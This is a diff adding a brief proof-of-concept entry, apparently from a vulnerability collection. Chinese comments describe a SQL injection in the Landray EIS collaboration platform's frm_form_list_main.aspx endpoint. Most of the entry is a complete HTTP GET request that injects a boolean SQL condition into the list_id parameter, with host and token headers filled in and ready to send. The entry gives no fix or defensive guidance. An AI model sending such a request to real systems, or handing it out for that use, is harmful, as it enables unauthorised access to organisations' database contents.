@@ -1,0 +1,10 @@
+# 蓝凌EIS智慧协同平台frm_form_list_main SQL注入漏洞
+# 蓝凌EIS智慧协同平台是一款专为成长型企业打造的智慧办公云平台，深度融合了阿里钉钉的功能。该平台旨在通过增强组织的协同在线、业务在线和生态在线，提升企业的工作效率和管理便捷性。
+# 蓝凌EIS智慧协同平台frm_form_list_main.aspx接口未进行过滤和验证导致存在SQL注入漏洞，攻击者通过该漏洞可获取数据库敏感信息。
+GET /frm/frm_form_list_main.aspx?acid=80052386&list_id=1%20and%201=2--+&bid=hd_tag_m8mv24wd HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24wd
+RM-PRO-Token: cc14fabe46e3ff221d1bd31934899a1e
+RM-PRO-Time: 1742808419089
+User-Agent: curl/7.83.1
+
